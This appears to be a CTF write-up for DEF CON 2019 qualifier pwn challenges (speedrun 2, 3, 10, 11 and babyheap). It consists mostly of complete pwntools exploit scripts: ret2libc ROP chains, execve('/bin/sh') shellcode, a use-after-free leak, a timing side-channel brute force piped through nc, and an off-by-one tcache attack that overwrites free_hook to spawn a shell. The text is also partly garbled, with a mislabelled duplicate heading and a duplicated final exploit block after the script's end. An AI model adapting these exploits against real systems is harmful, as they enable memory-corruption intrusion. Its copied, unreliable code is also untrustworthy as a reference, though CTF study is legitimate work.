# speedrun 

## 2

ret2libc:
```python
from pwn import *
context.log_level = "DEBUG"
p = remote("speedrun-002.quals2019.oooverflow.io", 31337)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = next(libc.search('/bin/sh\x00'))
puts = libc.symbols['puts']
system = libc.symbols['system']


p.recvuntil("?")
p.sendline("Everything intelligent is so boring.")

p.recvuntil(".")
payload = "A" * (0x400 + 0x8)
payload += p64(0x4008a3)
payload += p64(0x601028)
payload += p64(0x4005B0)
payload += p64(0x4007CE) * 2
p.sendline(payload)
p.recvuntil("Fascinating.\n")
leak_puts = u64(p.recvn(6) + '\x00\x00')

print hex(leak_puts)

system = leak_puts - puts + system
sh = leak_puts - puts + sh

p.recvuntil("?")
p.sendline("Everything intelligent is so boring.")
sleep(1)
payload = "A" * (0x408)
payload += p64(0x4008a3)
payload += p64(sh)
payload += p64(0x4006ec)
payload += p64(0)
payload += p64(0x4008a1)
payload += p64(0) * 2
payload += p64(system)
payload += p64(0)
p.sendline(payload)

p.interactive()
```

## 2

It requires us to write a symmetric shellcode. We can writer a shorted shellcode which calls `read` to overwrite old shellcode and then put `execve("/bin/sh", 0, 0)" shellcode:
```python

from pwn import *
context.log_level = "DEBUG"
p = process("./speedrun-003")
gdb.attach(p)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = next(libc.search('/bin/sh\x00'))
puts = libc.symbols['puts']
system = libc.symbols['system']

p.recvuntil("?")
payload = '\xcc\x48\x31\xff\x48\x89\xd6\x4c\x89\xda\x0f\x05' + 'AAA'
payload += payload
payload += "A" * 12 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.sendline(payload)
p.interactive()
```

# 10

There is **UAF** in heap:
```python
from pwn import *

p = remote("speedrun-010.quals2019.oooverflow.io", 31337)
context.log_level = "DEBUG"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
execve_off = libc.symbols['execve']

def malloc_a(content):
    p.sendafter(".", "1")
    p.sendafter("name", content)

def malloc_b(content):
    p.sendafter(".", "2")
    p.sendafter("message", content)

def free_a():
    p.sendafter(".", "3")

def free_b():
    p.sendafter(".", "4")

# leak chunks
malloc_a("/bin/sh\x00") # idx1 1
malloc_b("/bin/sh\x00") # idx2 2
free_a()
free_b()
malloc_a("/bin/sh\x00") # idx1 2
malloc_b("A" * (0x10 - 1) + "B" * 1) # idx2 1

p.recvuntil("B")
leak_puts = u64(p.recvn(6) + "\x00\x00")
print "Leak puts: " + hex(leak_puts)
libc_base = leak_puts - puts_off
system = libc_base + system_off
execve = libc_base + execve_off

free_a()
malloc_b("/bin/sh\x00" * 2 + p64(system))

p.interactive()
```

## 11

All the file descriptors are closed. However, we can use tricks similar to time injection in SQL. If the character is the same as the payload one, we call an forbidden syscall to terminate the program. Otherwise we use a infinite loop to keep running. The `alarm` is 5 seconds, which is long enough to determine program status:
```python
#!/usr/bin/python
from pwn import *
import socket
import sys,os,time

def sh(char, offset):
    #print "Making shellcode"
    shellcode = "\x90" # debug
    shellcode += "\x48\x31\xc0" # xor rax, rax
    if offset != 0:
        shellcode += "\x66\x8b\x42" + chr(offset) # mov ax, [rdx + offset]
    else:
        shellcode += "\x66\x8b\x02"
    shellcode += "\x3c" + char     # cmp al, char
    shellcode += "\x90" * 6     # nop
    shellcode += "\x74\xfb"     # jee -3 to infinite loop
    shellcode += "\x48\x31\xc0" # xor rax, rax
    shellcode += "\xb0\x3b"     # mov al, 59
    shellcode += "\x0f\x05"     # fake syscall to quit
    return shellcode

print "Start"
for i in range(0, 10):
    for ch in range(0x20, 0x7f):
        shellcode = sh(chr(ch), i)
        start = time.time()
        #print "offset: " + str(i) + ", char: " + chr(ch)
        os.system("echo '" + shellcode + "' | " + "nc speedrun-011.quals2019.oooverflow.io 31337 >> info")
        now = time.time()
        if now - start > 2:
            print "Probable leak at locatio: " + str(i) + " as: " + chr(ch) + " with time: " + str(now - start)
```

# Babyheap

Easy heap challenge, there is an **off by one** in the `0x100` size chunk. We can use it to create overlap chunks. Then, use `puts` to leak and finally change the chunk link list to overwrite `free_hook`:
```python

from pwn import *

p = remote("babyheap.quals2019.oooverflow.io",5000)
#gdb.attach(p)
context.log_level = "DEBUG"

def malloc(size, content, send = False):
    p.sendlineafter(":", "M")
    p.sendlineafter(":", str(size))
    if send == False:
        p.sendlineafter(":", content)
    else:
        p.sendafter(":", content)

def free(idx):
    p.sendlineafter(":", "F")
    p.sendlineafter(":", str(idx))

def show(idx):
    p.sendlineafter(":", "S")
    p.sendlineafter(":", str(idx))


malloc(0xf8, "0" * 0xf8) # 0
malloc(0xf8, "1" * 0xf8) # 1
malloc(0xf8, "2" * 0xf8) # 2

# off by one
free(2)
free(0)
malloc(0xf8, "\x81" * 0xf9) # 0

# leak heap
free(1)
malloc(0x177, "1" * (0xf8 + 0x10 - 1) + "B") # 1
show(1)
p.recvuntil("B")

heap_addr = u64(p.recvn(6) + "\x00\x00")
print "leak heap: " + hex(heap_addr)

# recover 2
free(1)
malloc(0xf8 + 2, "1" * (0xf8) + "\x01\x01") # 1
malloc(0xf8, "2") # 2

# fill tcache
for i in range(3, 10):
    malloc(0xf8, str(i))
for i in range(3, 10):
    free(i)

# leak unsorted bin
free(2)
free(1)
malloc(0xf8 + 0x8, "1" * (0xf8 + 0x8 - 1) + "B") # 1
show(1)
p.recvuntil("B")
libc_leak = u64(p.recvn(6) + "\x00\x00") - (0xa0 - 0x40)
system_addr = libc_leak - 1645680
libc_base = system_addr - 0x52fd0
print "Libc addr: " + hex(libc_base)

# recover chunk
free(1)
malloc(0xf8 + 2, "1" * (0xf8) + "\x01\x01") # 1

# some other chunk, and final our unsorted bin
for i in range(3, 10):
    malloc(0xf8, str(i))

# chang link list
malloc(0xf8, "QAQ") # 9
for i in range(3, 6):
    free(i)
free(9)
free(1)
print 'Overwrite free hook: ' + hex(libc_base + 0x1e75a8)
malloc(0xf8 + 0x8 + 0x8, "1" * (0xf8) + 0x8 * "A" + p64(libc_base + 0x1e75a8).replace('\x00', ''))

malloc(0xf8, "/bin/sh\x00", send = True)
malloc(0xf8, p64(libc_base + 0xe2383).replace('\x00', ''))
free(3)
p.interactive()

# some other chunk, and final our unsorted bin
for i in range(3, 10):
    malloc(0xf8, str(i))

# chang link list
malloc(0xf8, "QAQ") # 9
for i in range(3, 6):
    free(i)
free(9)
free(1)
print 'Overwrite free hook: ' + hex(libc_base + 0x1e75a8)
malloc(0xf8 + 0x8 + 0x8, "1" * (0xf8) + 0x8 * "A" + p64(libc_base + 0x1e75a8).replace('\x00', ''))

malloc(0xf8, "ls")
malloc(0xf8, p64(system_addr).replace('\x00', ''))
free(3)
p.interactive()
```